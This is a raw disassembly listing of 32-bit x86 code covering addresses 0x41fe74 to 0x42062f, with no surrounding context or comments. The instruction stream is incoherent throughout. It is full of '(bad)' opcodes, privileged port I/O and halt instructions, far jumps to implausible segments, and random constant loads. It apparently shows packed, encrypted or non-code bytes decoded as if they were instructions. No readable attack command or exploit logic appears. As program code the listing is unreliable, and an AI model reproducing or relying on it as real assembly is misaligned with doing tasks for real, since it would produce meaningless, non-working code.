  41fe74:	sbb    DWORD PTR ds:0xb0909b29,esi
  41fe7a:	int3   
  41fe7b:	stos   BYTE PTR es:[edi],al
  41fe7c:	fbstp  TBYTE PTR [ecx+0x69]
  41fe7f:	mov    bl,0xc6
  41fe81:	scas   eax,DWORD PTR es:[edi]
  41fe82:	mov    cl,0xd0
  41fe84:	add    dh,BYTE PTR [ebx]
  41fe86:	call   0x9f37b519
  41fe8b:	outs   dx,DWORD PTR ds:[esi]
  41fe8c:	ja     0x41fe13
  41fe8e:	pop    esi
  41fe8f:	lds    edx,FWORD PTR [esi]
  41fe91:	sub    al,0xd1
  41fe93:	arpl   WORD PTR [ebp-0x4d],dx
  41fe96:	mov    ebp,0xd5ee0b4e
  41fe9b:	push   edx
  41fe9c:	and    eax,0x1afd6aa3
  41fea1:	mov    esp,0x58484b0
  41fea6:	jle    0x41fe66
  41fea8:	ss or  edx,edx
  41feab:	mov    ds:0x4a71900a,eax
  41feb0:	test   DWORD PTR [edi-0x3d199086],edx
  41feb6:	imul   ebx,DWORD PTR [eax-0x67],0x27
  41feba:	sbb    bh,bh
  41febc:	or     al,0x52
  41febe:	push   ss
  41febf:	ja     0x41febe
  41fec1:	dec    esp
  41fec2:	mov    esp,0xe21eafbe
  41fec7:	pop    ss
  41fec8:	leave  
  41fec9:	dec    ebp
  41feca:	jbe    0x41fe97
  41fecc:	push   0x914f58cb
  41fed1:	pop    ebx
  41fed2:	out    0x13,eax
  41fed4:	push   edi
  41fed5:	jne    0x41ff42
  41fed7:	jns    0x41ff46
  41fed9:	repz pop edx
  41fedb:	ret    
  41fedc:	cmp    eax,0x621ed2b1
  41fee1:	aas    
  41fee2:	mov    edx,DWORD PTR ds:[esi]
  41fee5:	mov    eax,0x79bfd8e6
  41feea:	sbb    bh,dh
  41feec:	bound  edi,QWORD PTR [esi-0x299d2208]
  41fef2:	inc    ebp
  41fef3:	xchg   DWORD PTR [ecx-0x195f4d0],ebx
  41fef9:	mov    dh,0xb8
  41fefb:	sti    
  41fefc:	jae    0x41ff35
  41fefe:	sub    eax,0x4f4aa440
  41ff03:	test   BYTE PTR [ebx-0x3e01bb5b],bl
  41ff09:	int3   
  41ff0a:	add    eax,0x97124df2
  41ff0f:	mov    ch,0x8c
  41ff11:	jle    0x41fe9e
  41ff13:	(bad)  
  41ff15:	sub    al,0xb3
  41ff17:	xchg   esi,eax
  41ff18:	xor    DWORD PTR [edi],ecx
  41ff1a:	call   0x24ee:0xead8e242
  41ff21:	test   al,0x4f
  41ff23:	mov    DWORD PTR [edx+0x4096f173],ebp
  41ff29:	xor    eax,0x434ff921
  41ff2e:	in     al,dx
  41ff2f:	push   eax
  41ff30:	jmp    0x41ff7f
  41ff32:	pop    edx
  41ff33:	dec    edx
  41ff34:	fst    QWORD PTR [edx-0x5d]
  41ff37:	push   0x4815916a
  41ff3c:	mov    DWORD PTR [ebx+0x69],ebp
  41ff3f:	aas    
  41ff40:	test   eax,0xa9ba6d03
  41ff45:	pusha  
  41ff46:	jb     0x41ff64
  41ff48:	fs clc 
  41ff4a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ff4b:	retf   
  41ff4c:	pop    ebx
  41ff4d:	add    BYTE PTR [ecx+edi*4+0x4e369d6c],ch
  41ff54:	outs   dx,DWORD PTR ds:[esi]
  41ff55:	dec    eax
  41ff56:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ff57:	test   DWORD PTR [eax-0x36],edi
  41ff5a:	hlt    
  41ff5b:	shr    DWORD PTR [edi-0x5e],1
  41ff5e:	xchg   ecx,eax
  41ff60:	cmp    esp,DWORD PTR [eax]
  41ff62:	outs   dx,BYTE PTR ds:[esi]
  41ff63:	pop    ecx
  41ff64:	je     0x41ff67
  41ff66:	shl    DWORD PTR [edx+0x2b5759e1],1
  41ff6c:	fbstp  TBYTE PTR [edi]
  41ff6e:	inc    edi
  41ff6f:	dec    ebx
  41ff70:	xor    BYTE PTR [ebp-0xd],al
  41ff73:	push   0x0
  41ff75:	jecxz  0x41ff32
  41ff77:	push   ebx
  41ff78:	or     ecx,DWORD PTR [edx-0x32]
  41ff7b:	in     eax,0x5
  41ff7d:	repz adc BYTE PTR [edi-0x421db1a2],dl
  41ff84:	cs jne 0x41ff69
  41ff87:	pop    ebx
  41ff88:	and    al,ah
  41ff8a:	int    0x1e
  41ff8c:	sub    al,0xc3
  41ff8e:	sbb    esp,edx
  41ff90:	lods   eax,DWORD PTR ds:[esi]
  41ff91:	iret   
  41ff92:	fistp  QWORD PTR [edx-0x3d]
  41ff95:	inc    edi
  41ff96:	enter  0xb13d,0xbc
  41ff9a:	jmp    0xf9bb:0xea4496d4
  41ffa1:	mov    WORD PTR [eax-0x52],fs
  41ffa4:	lahf   
  41ffa5:	sbb    ebx,DWORD PTR [ecx]
  41ffa7:	dec    esi
  41ffa8:	push   es
  41ffa9:	jecxz  0x41ffd4
  41ffab:	jmp    0xcad71c8a
  41ffb0:	xor    eax,0x4cffe30a
  41ffb5:	or     cl,dl
  41ffb7:	rol    DWORD PTR [edx+eiz*1-0x40],1
  41ffbb:	leave  
  41ffbc:	jmp    0x1397:0x9b2e6dcd
  41ffc3:	mov    dh,al
  41ffc5:	jmp    0x74733ce
  41ffca:	push   ds
  41ffcb:	iret   
  41ffcc:	mov    eax,0xb5d2622f
  41ffd1:	mov    cl,0x5b
  41ffd3:	outs   dx,DWORD PTR ds:[esi]
  41ffd4:	pop    es
  41ffd5:	inc    eax
  41ffd6:	ror    BYTE PTR [esi],0x3c
  41ffd9:	jle    0x420019
  41ffdb:	stos   BYTE PTR es:[edi],al
  41ffdc:	(bad)  
  41ffdd:	fisttp WORD PTR [esi-0x38b79e25]
  41ffe3:	std    
  41ffe4:	sahf   
  41ffe5:	jnp    0x41fffa
  41ffe7:	dec    ecx
  41ffe8:	jns    0x420030
  41ffea:	jl     0x420003
  41ffec:	es xchg esp,eax
  41ffee:	test   al,0xfc
  41fff0:	(bad)  
  41fff1:	jb     0x42004f
  41fff3:	cmp    eax,0xe68d89a4
  41fff8:	sub    ah,BYTE PTR [ecx-0x452fc687]
  41fffe:	(bad)  
  41ffff:	pushf  
  420000:	das    
  420001:	cld    
  420002:	ret    
  420003:	(bad)  [eax]
  420005:	imul   ebp,ecx,0x74
  420008:	cmp    eax,0xa976b2ff
  42000d:	enter  0x59c6,0xeb
  420011:	push   ss
  420012:	fld    DWORD PTR [edi]
  420014:	int    0x41
  420016:	pop    esi
  420017:	in     al,dx
  420018:	cli    
  420019:	popa   
  42001a:	popa   
  42001b:	push   esi
  42001c:	(bad)  
  42001d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42001e:	nop
  42001f:	data16 clc 
  420021:	cmp    al,0xc8
  420023:	mov    WORD PTR [edi+0x4d],ss
  420026:	es cmc 
  420028:	lock (bad) 
  42002a:	call   0xc094e492
  42002f:	cmp    esi,edx
  420031:	es loope 0x420060
  420034:	sbb    DWORD PTR [edi-0x6],0x7eae08a1
  42003b:	jmp    DWORD PTR [ebx+0x409eaa6]
  420041:	fs jb  0x420042
  420044:	mov    dh,BYTE PTR [ebp+ebp*4-0x3f00450c]
  42004b:	fldl2t 
  42004d:	out    0xe0,eax
  42004f:	mov    edx,0x441924dc
  420054:	aaa    
  420055:	ffree  st(6)
  420057:	jp     0x41ffeb
  420059:	jmp    0x42000f
  42005b:	adc    bh,BYTE PTR ds:[edx]
  42005e:	and    DWORD PTR [ecx+0x6603f2f5],esi
  420064:	inc    esp
  420065:	push   ss
  420066:	xchg   esi,eax
  420067:	push   eax
  420068:	outs   dx,DWORD PTR ds:[esi]
  420069:	jno    0x4200cf
  42006b:	push   edi
  42006c:	adc    DWORD PTR [ebx-0x73],esp
  42006f:	add    BYTE PTR [ecx+0x6f],ch
  420072:	mov    BYTE PTR [edx+edi*1-0x1dd78f5a],bl
  420079:	test   DWORD PTR [esi],ebp
  42007b:	jno    0x42007a
  42007d:	fsub   DWORD PTR [esp+esi*8]
  420080:	cs ror cl,0x2e
  420084:	bound  ebx,QWORD PTR [eax-0x4d]
  420087:	sahf   
  420088:	lahf   
  420089:	mul    DWORD PTR [eax]
  42008b:	jbe    0x420057
  42008d:	fxam   
  42008f:	jmp    0x111c:0xd6f548f5
  420096:	push   ds
  420097:	push   es
  420098:	dec    ecx
  420099:	mov    edi,0x31bdd5ba
  42009e:	and    dh,BYTE PTR [ebx-0x30c41d93]
  4200a4:	pushf  
  4200a5:	test   al,0xe4
  4200a7:	outs   dx,DWORD PTR ds:[esi]
  4200a8:	mov    ecx,DWORD PTR ds:0xbb924327
  4200ae:	inc    dh
  4200b0:	mov    ecx,0xb0c0e07e
  4200b5:	xor    al,BYTE PTR ds:0x59453ff5
  4200bb:	cmp    dl,dl
  4200bd:	repz mov eax,ds:0x4d2bc7cb
  4200c3:	stos   BYTE PTR es:[edi],al
  4200c4:	push   esi
  4200c5:	pop    ss
  4200c6:	push   ebx
  4200c7:	dec    ecx
  4200c8:	ficomp DWORD PTR [esi]
  4200ca:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4200cb:	fcomp  QWORD PTR [edi+0x5b4e4a9b]
  4200d1:	xchg   esp,eax
  4200d2:	jmp    0xb6127d89
  4200d7:	in     eax,0x95
  4200d9:	imul   esi,DWORD PTR [esi+0x79],0xde75a37e
  4200e0:	aam    0xed
  4200e2:	fwait
  4200e3:	les    ebp,FWORD PTR [ebx-0x14e4b9d7]
  4200e9:	sub    eax,DWORD PTR [ecx]
  4200eb:	leave  
  4200ec:	gs loopne 0x420112
  4200ef:	(bad)  
  4200f1:	add    DWORD PTR [ebx],ebp
  4200f3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4200f4:	ror    DWORD PTR [edx-0x46cb539b],cl
  4200fa:	sbb    eax,0x307db356
  4200ff:	mov    ds:0x84032324,al
  420104:	fs cli 
  420106:	mov    ss,WORD PTR [ecx]
  420108:	jp     0x4200d4
  42010a:	cs icebp 
  42010c:	adc    DWORD PTR [edx-0x64],ebx
  42010f:	cmp    ebp,ecx
  420111:	cld    
  420112:	mov    ebx,0x4ca89c88
  420117:	jnp    0x420153
  420119:	ret    
  42011a:	aas    
  42011b:	into   
  42011c:	mov    dh,0x65
  42011e:	dec    esi
  42011f:	add    DWORD PTR [edx],ebx
  420121:	ins    BYTE PTR es:[edi],dx
  420122:	and    al,0x16
  420124:	fimul  WORD PTR [edx]
  420126:	in     eax,dx
  420127:	push   edi
  420128:	sbb    al,0x24
  42012a:	loopne 0x4200f3
  42012c:	popf   
  42012d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42012e:	xor    al,0xba
  420130:	or     eax,0x22e22b3f
  420135:	mov    WORD PTR [edi+ecx*2],ds
  420138:	sub    eax,ebp
  42013a:	adc    eax,0xc0aec67f
  42013f:	in     eax,dx
  420140:	test   BYTE PTR ds:0xf912e770,dh
  420146:	and    al,0xb5
  420148:	sbb    eax,0x962c5373
  42014d:	push   es
  42014e:	pop    ebx
  42014f:	sub    BYTE PTR [eax],ah
  420151:	push   ecx
  420152:	mov    esi,0xbbf9afa4
  420157:	mov    al,0xf3
  420159:	jmp    0x4201b8
  42015b:	xchg   ebp,eax
  42015c:	addr16 sub eax,0x19df6005
  420162:	fadd   DWORD PTR [ebp+ebx*8-0x413af3c4]
  420169:	popf   
  42016a:	push   es
  42016b:	or     eax,0xfaf3f082
  420170:	lea    ebx,[edi-0x7dba6fcd]
  420176:	(bad)  
  420177:	ins    BYTE PTR es:[edi],dx
  420178:	sbb    eax,0x155dd52c
  42017d:	addr16 cld 
  42017f:	or     bl,BYTE PTR [ecx]
  420181:	push   ebp
  420182:	ins    DWORD PTR es:[edi],dx
  420183:	xor    al,0x49
  420185:	sub    eax,0xc58f4fd6
  42018a:	sar    BYTE PTR [ecx-0x54],0x7b
  42018e:	dec    edi
  42018f:	inc    esp
  420190:	and    cl,BYTE PTR ss:[eax+0x18aa46de]
  420197:	loop   0x4201e8
  420199:	pop    ebx
  42019a:	pop    esp
  42019b:	add    al,0xfc
  42019d:	cmp    BYTE PTR [ecx],0x20
  4201a0:	outs   dx,DWORD PTR ds:[esi]
  4201a1:	(bad)  
  4201a2:	push   ss
  4201a3:	(bad)  
  4201a4:	mov    ecx,0x3b2bd063
  4201a9:	shl    DWORD PTR [edi],1
  4201ab:	imul   ebx,DWORD PTR [eax-0x12],0x4a
  4201af:	adc    ch,BYTE PTR [edi-0x37]
  4201b2:	adc    dl,dl
  4201b4:	aaa    
  4201b5:	and    eax,0x5da09fae
  4201ba:	sub    BYTE PTR [ebp+0x16b37869],al
  4201c0:	xchg   ebp,eax
  4201c1:	adc    al,0x60
  4201c3:	outs   dx,BYTE PTR ds:[esi]
  4201c4:	hlt    
  4201c5:	psrlq  mm2,QWORD PTR [edi]
  4201c8:	dec    esp
  4201c9:	cdq    
  4201ca:	push   esp
  4201cb:	ror    BYTE PTR [esi+0x3d],1
  4201ce:	xor    al,BYTE PTR [ebp-0x34]
  4201d1:	xchg   esp,eax
  4201d2:	xor    ch,bl
  4201d4:	jmp    0x1e8afb7f
  4201d9:	adc    BYTE PTR ds:0x4269c7e7,dl
  4201df:	dec    edi
  4201e0:	int    0xba
  4201e2:	and    DWORD PTR [ebp+0x7c],0x8ad4f26a
  4201e9:	out    0x77,al
  4201eb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4201ec:	mov    eax,ds:0xb09bb2c9
  4201f1:	sbb    ecx,edx
  4201f3:	and    BYTE PTR [ebp+0x3b184608],ah
  4201f9:	sbb    BYTE PTR [edx+0x5acbad49],dl
  4201ff:	in     eax,dx
  420200:	mov    ebx,0x3ba2016d
  420205:	pop    edi
  420206:	repz addr16 inc ecx
  420209:	call   0x48203077
  42020e:	xchg   edi,eax
  42020f:	je     0x42022a
  420211:	push   0x14
  420213:	pop    es
  420214:	test   BYTE PTR [edi-0x10ca948a],cl
  42021a:	cmp    eax,0xbdde5a29
  42021f:	iret   
  420220:	(bad)  
  420222:	adc    ecx,DWORD PTR [edx+0x50]
  420225:	dec    ebp
  420226:	fdivr  QWORD PTR [eax+0xe]
  420229:	in     eax,0xc0
  42022b:	jp     0x42021a
  42022d:	rcr    DWORD PTR [ecx+0x56deca65],1
  420233:	add    BYTE PTR [ebp-0x3ebd5742],dl
  420239:	stos   DWORD PTR es:[edi],eax
  42023a:	ins    BYTE PTR es:[edi],dx
  42023b:	(bad)  
  42023d:	xchg   edx,eax
  42023e:	dec    ebx
  42023f:	sub    esp,DWORD PTR [esi+0x7733dd44]
  420245:	ss ja  0x4202b3
  420248:	mov    eax,ds:0x21c88dc1
  42024d:	call   0x1d90f602
  420252:	aad    0xe1
  420254:	push   esi
  420255:	mov    bl,0x11
  420257:	pop    es
  420258:	call   0x2a21:0xc4591738
  42025f:	(bad)  
  420260:	ret    0x3816
  420263:	lods   al,BYTE PTR ds:[esi]
  420264:	xchg   BYTE PTR [ecx+esi*2],cl
  420267:	mov    ah,0x7a
  420269:	(bad)  [edx+0xc62febb]
  42026f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420270:	ret    0xf952
  420273:	xchg   ebx,eax
  420274:	and    ch,BYTE PTR [edi]
  420276:	dec    esi
  420277:	std    
  420278:	jbe    0x420273
  42027a:	pop    ds
  42027b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42027c:	jp     0x420210
  42027e:	sti    
  42027f:	add    BYTE PTR [ecx-0x3fec86f3],al
  420285:	das    
  420286:	in     eax,dx
  420287:	add    DWORD PTR [esi-0x30],edi
  42028a:	js     0x4202d3
  42028c:	ds sub eax,0xdea036b2
  420292:	cmp    DWORD PTR [ebp+0x3a],0x56bb3af1
  420299:	(bad)  
  42029a:	imul   esi,DWORD PTR [ebp+0x2bfedcf9],0xba8a4839
  4202a4:	or     esp,DWORD PTR [eax]
  4202a6:	fsub   st(2),st
  4202a8:	cmp    eax,0xffffffda
  4202ab:	sub    ecx,0xe66b7a6a
  4202b1:	xchg   DWORD PTR [edi-0x51ded158],eax
  4202b7:	test   cl,dl
  4202b9:	enter  0xfa7c,0xc9
  4202bd:	pushf  
  4202be:	lods   al,BYTE PTR ds:[esi]
  4202bf:	int3   
  4202c0:	loop   0x420339
  4202c2:	cmp    ebp,DWORD PTR [edi+edx*2+0x7d]
  4202c6:	xchg   edi,eax
  4202c7:	cmc    
  4202c8:	addr16 sti 
  4202ca:	mov    WORD PTR [ecx+edx*8-0x54],ss
  4202ce:	sbb    ch,ah
  4202d0:	popa   
  4202d1:	imul   ecx,DWORD PTR [ebp+0x45],0x5f
  4202d5:	sbb    bh,BYTE PTR [ecx]
  4202d7:	fsub   DWORD PTR [edi-0x56]
  4202da:	adc    al,0x99
  4202dc:	je     0x420300
  4202de:	sub    al,BYTE PTR [edx]
  4202e0:	push   edi
  4202e1:	xor    al,0x40
  4202e3:	cmp    edi,DWORD PTR [ebx-0xb]
  4202e6:	push   edi
  4202e7:	xchg   esi,eax
  4202e8:	retw   0xea90
  4202ec:	aam    0xe1
  4202ee:	or     BYTE PTR [ecx+0x70],al
  4202f1:	fstp   QWORD PTR [edx+0x607e3a48]
  4202f7:	stos   DWORD PTR es:[edi],eax
  4202f8:	test   al,0x1c
  4202fa:	xor    ebp,DWORD PTR [edi-0x16]
  4202fd:	xor    ecx,ebp
  4202ff:	xor    dh,ah
  420301:	sub    al,0xb9
  420303:	repnz xor edi,DWORD PTR gs:[ecx+0x78139ba]
  42030b:	xchg   BYTE PTR [ecx],dl
  42030d:	mov    cl,0x61
  42030f:	(bad)  
  420311:	stos   DWORD PTR es:[edi],eax
  420312:	cld    
  420313:	lahf   
  420314:	sbb    cl,cl
  420316:	dec    edi
  420317:	shl    esi,0xa5
  42031a:	cld    
  42031b:	std    
  42031c:	xor    al,0x2e
  42031e:	fwait
  42031f:	or     eax,0x412c35d3
  420324:	xchg   ecx,eax
  420325:	stc    
  420326:	xor    DWORD PTR [eax+0x13],eax
  420329:	not    ch
  42032b:	cmp    eax,0x8c44bc3a
  420330:	ror    DWORD PTR [eax],0x4b
  420333:	test   DWORD PTR [ecx-0x38b1cc1b],0xdfb8c391
  42033d:	dec    ecx
  42033e:	aaa    
  42033f:	repz and sp,sp
  420343:	adc    eax,0xccb18612
  420348:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420349:	lahf   
  42034a:	ror    BYTE PTR ds:0xa1ae0fe,cl
  420350:	test   al,0x3
  420352:	pop    ecx
  420353:	loopne 0x420369
  420355:	scas   eax,DWORD PTR es:[edi]
  420356:	nop
  420357:	je     0x4202f9
  420359:	dec    edx
  42035a:	les    edx,FWORD PTR [eax]
  42035c:	pop    edi
  42035d:	jg     0x420360
  42035f:	repnz adc BYTE PTR [edx-0x624e3281],cl
  420366:	shr    DWORD PTR [ecx],cl
  420368:	(bad)  
  420369:	adc    al,0xf
  42036b:	fsub   DWORD PTR [eax]
  42036d:	mov    eax,ds:0xad34459e
  420372:	rol    BYTE PTR [edi+0xe45ae25],cl
  420378:	dec    edx
  420379:	mov    edx,0xe84ef49a
  42037e:	test   BYTE PTR [esi+0xf],ah
  420381:	aas    
  420382:	shl    DWORD PTR [esi],1
  420384:	jmp    0xf5f30e89
  420389:	pushf  
  42038a:	and    cl,BYTE PTR [edx]
  42038c:	mov    ebx,DWORD PTR [eax+ebx*4]
  42038f:	pop    ss
  420390:	cmp    DWORD PTR [edx+0x4d],eax
  420393:	push   ecx
  420394:	xchg   ebx,eax
  420395:	mov    ah,0xd4
  420397:	sub    bl,BYTE PTR [edi]
  420399:	and    al,0xf3
  42039b:	jl     0x4203d8
  42039d:	shr    BYTE PTR [esi+0x2a],cl
  4203a0:	lods   al,BYTE PTR ds:[esi]
  4203a1:	sub    BYTE PTR [edi+0x58],0x8
  4203a5:	ror    BYTE PTR [esi-0x466016a4],cl
  4203ab:	adc    DWORD PTR [ecx-0x7c],edi
  4203ae:	pop    ss
  4203af:	mov    bl,0x85
  4203b1:	pop    eax
  4203b2:	mov    dh,BYTE PTR [edx+0x22915292]
  4203b8:	mov    dl,0xde
  4203ba:	mov    cl,0x25
  4203bc:	das    
  4203bd:	mov    bh,0x8c
  4203bf:	mov    bl,0x22
  4203c1:	inc    esp
  4203c2:	and    edx,DWORD PTR [edi+0x529dbe0a]
  4203c8:	pop    ebp
  4203c9:	leave  
  4203ca:	jo     0x4203a1
  4203cc:	mov    esi,0xafc3b1ce
  4203d1:	pop    ebx
  4203d2:	(bad)  
  4203d3:	jno    0x420364
  4203d5:	lods   eax,DWORD PTR ds:[esi]
  4203d6:	pop    ecx
  4203d7:	dec    eax
  4203d8:	fdivp  st(0),st
  4203da:	add    eax,0xe24a2ae7
  4203df:	xor    eax,0xc6c106b2
  4203e4:	inc    eax
  4203e5:	gs push 0xffffffe0
  4203e8:	out    0xd5,al
  4203ea:	cld    
  4203eb:	repz mov ecx,0x394bd3c6
  4203f1:	push   0x72e67be
  4203f6:	dec    DWORD PTR [edi+0x48]
  4203f9:	pop    ebp
  4203fa:	cmp    al,0x3b
  4203fc:	pop    esp
  4203fd:	adc    eax,0x6ad3e2b3
  420402:	cli    
  420403:	cs mov ebx,0x91cf4c1a
  420409:	mov    esp,0x1d0758d9
  42040e:	fdiv   DWORD PTR [ebx-0x4e]
  420411:	psubq  mm0,QWORD PTR [esi+0x43bd38f4]
  420418:	(bad)  
  420419:	push   ebp
  42041a:	mov    dl,0xc8
  42041c:	jae    0x4203ec
  42041e:	pop    esp
  42041f:	mov    ds:0xa704b08c,al
  420424:	adc    eax,0x8853512a
  420429:	arpl   WORD PTR [edx+eiz*4+0x4a3c8007],sp
  420430:	outs   dx,DWORD PTR ds:[esi]
  420431:	inc    esi
  420432:	loop   0x4204ae
  420434:	(bad)  
  420435:	loope  0x42040d
  420437:	mov    ah,0x40
  420439:	sbb    DWORD PTR [edx+edi*4],ecx
  42043c:	mov    eax,ds:0x78798745
  420441:	icebp  
  420442:	lods   al,BYTE PTR ds:[esi]
  420443:	iret   
  420444:	hlt    
  420445:	in     eax,0x5a
  420447:	jo     0x4204a6
  420449:	rol    BYTE PTR [ebp+eiz*8+0x443c8652],0xa6
  420451:	leave  
  420452:	outs   dx,DWORD PTR ds:[esi]
  420453:	mov    ah,0x52
  420455:	and    ecx,DWORD PTR [ebx-0x3d]
  420458:	push   ds
  420459:	loope  0x4203dd
  42045b:	bound  ebp,QWORD PTR [esi-0x134db370]
  420461:	add    ch,cl
  420463:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420464:	test   al,0x4e
  420466:	shl    DWORD PTR [edi-0x21],1
  420469:	add    esp,DWORD PTR [edi+0x717a17b8]
  42046f:	test   dh,al
  420471:	inc    ebp
  420472:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420473:	sbb    BYTE PTR [eax],bh
  420475:	mov    dl,0x32
  420477:	cmp    ah,BYTE PTR [ecx+ebp*4+0x7a1131fc]
  42047e:	adc    al,0x29
  420480:	xlat   BYTE PTR ds:[ebx]
  420481:	cmp    DWORD PTR [edi],esi
  420483:	sub    al,0xe
  420485:	pushw  ss
  420487:	shr    BYTE PTR [eax+0xffd9ed3],0x1d
  42048e:	and    DWORD PTR [esi+0x33],0xffffffc5
  420492:	test   eax,0x4b736394
  420497:	mov    ecx,0xbec06d89
  42049c:	imul   edx,DWORD PTR ds:0x79acf770,0xeb3320e4
  4204a6:	inc    esi
  4204a7:	mov    esi,0xe366a681
  4204ac:	pop    ebx
  4204ad:	lock mov al,0x64
  4204b0:	xchg   edi,eax
  4204b1:	sub    ebp,DWORD PTR fs:[esi]
  4204b4:	xor    al,0xc1
  4204b6:	call   0x1d26b33
  4204bb:	in     al,dx
  4204bc:	scas   eax,DWORD PTR es:[edi]
  4204bd:	inc    esp
  4204be:	push   es
  4204bf:	mov    bl,0x45
  4204c1:	pushf  
  4204c2:	repz aad 0xd3
  4204c5:	pop    esi
  4204c6:	and    al,0x5b
  4204c9:	outs   dx,DWORD PTR ds:[esi]
  4204ca:	(bad)  
  4204cb:	fisttp WORD PTR [ebx-0x8]
  4204ce:	xor    bl,BYTE PTR [edx]
  4204d0:	and    eax,0x4e567bf0
  4204d5:	jl     0x4204b0
  4204d7:	mov    ds:0x32dea613,al
  4204dc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4204dd:	aas    
  4204de:	(bad)  
  4204df:	mov    eax,ds:0x96529c8d
  4204e4:	adc    al,0xaf
  4204e6:	dec    ecx
  4204e7:	sti    
  4204e8:	jnp    0x42047d
  4204ea:	mov    dl,0x18
  4204ec:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4204ed:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4204ee:	in     al,0x61
  4204f0:	sbb    al,0x53
  4204f2:	popf   
  4204f3:	fist   DWORD PTR [eax]
  4204f5:	lods   eax,DWORD PTR ds:[esi]
  4204f6:	mov    al,ds:0x190d95d
  4204fb:	fdivr  DWORD PTR [ecx]
  4204fd:	push   esp
  4204fe:	xor    al,0x3
  420500:	cmp    DWORD PTR [edx],eax
  420502:	xchg   esp,eax
  420503:	xor    dl,BYTE PTR [esi]
  420505:	or     BYTE PTR [ebp+0x31122f74],0xd2
  42050c:	call   0x3bc62bd2
  420511:	sbb    eax,0x30835c02
  420516:	xchg   edi,eax
  420517:	mov    al,0x2d
  420519:	adc    ebp,DWORD PTR [edx+0x61]
  42051c:	sti    
  42051d:	sub    eax,0xc7a175c4
  420522:	push   es
  420523:	inc    ebp
  420524:	cmc    
  420525:	rcr    DWORD PTR [edx-0x61],0x8e
  420529:	lahf   
  42052a:	repz jne 0x420571
  42052d:	or     al,0x22
  42052f:	inc    eax
  420530:	fwait
  420531:	out    0xf3,eax
  420533:	scas   eax,DWORD PTR es:[edi]
  420534:	and    eax,0xef6e2135
  420539:	(bad)  
  42053a:	ficom  WORD PTR [edx]
  42053c:	push   0x71a84c8e
  420541:	ds mov esp,esp
  420544:	dec    ebx
  420545:	xchg   DWORD PTR [edi+ecx*4-0x1998fe9f],ebx
  42054c:	dec    eax
  42054d:	pop    eax
  42054e:	sar    BYTE PTR [edx],0xd6
  420551:	inc    DWORD PTR ds:0x2ce7a986
  420557:	mov    ds:0x8abe5612,al
  42055c:	and    eax,0x5b7da8d5
  420561:	adc    DWORD PTR [edi+ebp*1+0x27e1ecfa],ebp
  420568:	add    eax,0xaaac4857
  42056d:	jge    0x42058f
  42056f:	mov    cl,BYTE PTR [ebp-0x17]
  420572:	adc    eax,0x3b9d40bd
  420577:	mov    ebp,0xfcc358a4
  42057c:	lods   eax,DWORD PTR ds:[esi]
  42057d:	std    
  42057e:	gs aad 0xf3
  420581:	mov    ah,0x91
  420583:	cmp    eax,esp
  420585:	adc    al,0x50
  420587:	gs jge 0x4205b3
  42058a:	fcom   st(7)
  42058c:	push   eax
  42058d:	dec    eax
  42058e:	push   bp
  420590:	mov    gs,eax
  420592:	scas   eax,DWORD PTR es:[edi]
  420593:	lea    edi,[ecx]
  420595:	cmp    al,0xb9
  420597:	cmp    cl,0xb1
  42059a:	cmp    BYTE PTR [edi-0x40135ac2],ah
  4205a0:	sti    
  4205a1:	scas   eax,DWORD PTR es:[edi]
  4205a2:	pop    edx
  4205a3:	pop    eax
  4205a4:	pop    edx
  4205a5:	ret    0xed9f
  4205a8:	jecxz  0x42058d
  4205aa:	push   eax
  4205ab:	fdiv   QWORD PTR [eax+0x3b]
  4205ae:	sub    cl,BYTE PTR [ecx+eiz*2-0x38]
  4205b2:	pop    ebp
  4205b3:	jno    0x4205ed
  4205b5:	xor    ecx,esp
  4205b7:	or     cl,bh
  4205b9:	sbb    BYTE PTR [edi-0x4fe704fd],ch
  4205bf:	outs   dx,DWORD PTR ds:[esi]
  4205c0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4205c1:	(bad)  
  4205c2:	jecxz  0x4205ad
  4205c4:	test   BYTE PTR [ebx],cl
  4205c6:	jns    0x420592
  4205c8:	add    ah,bl
  4205ca:	les    edx,FWORD PTR [edx+0x4a87c02c]
  4205d0:	arpl   WORD PTR [ecx+0x4d],cx
  4205d3:	lods   al,BYTE PTR ds:[esi]
  4205d4:	cdq    
  4205d5:	stos   DWORD PTR es:[edi],eax
  4205d6:	xor    dh,bl
  4205d8:	sbb    al,bh
  4205da:	sub    al,ah
  4205dc:	popa   
  4205dd:	loope  0x4205ef
  4205df:	mov    ch,0xce
  4205e1:	cmc    
  4205e2:	jl     0x4205b9
  4205e4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4205e5:	in     al,0xee
  4205e7:	cmc    
  4205e8:	push   cs
  4205e9:	mov    ebp,0xa622f7e7
  4205ee:	mov    bl,0x7c
  4205f0:	cmp    edi,DWORD PTR [edx+ecx*2-0x4]
  4205f4:	and    ebx,DWORD PTR [ebx+0x6241a32c]
  4205fa:	cdq    
  4205fb:	cmp    edx,edx
  4205fd:	retf   0x365d
  420600:	(bad)  
  420601:	fmul   DWORD PTR [eax-0x34]
  420604:	mov    bl,0xb2
  420606:	leave  
  420607:	push   es
  420608:	sbb    al,0x8e
  42060a:	mov    dl,0xc8
  42060c:	xchg   esp,eax
  42060d:	fwait
  42060e:	mov    ebp,0xd207ab60
  420613:	pop    es
  420614:	fcom   QWORD PTR [ebx+0x59]
  420617:	adc    al,0xc4
  420619:	and    eax,0x8a421c8c
  42061e:	fimul  WORD PTR [edx+0x32dab2a9]
  420624:	pop    edx
  420625:	mov    esp,0xd6c0b492
  42062a:	out    0xc2,eax
  42062c:	adc    ebp,DWORD PTR [ebp-0x53]
  42062f:	into   
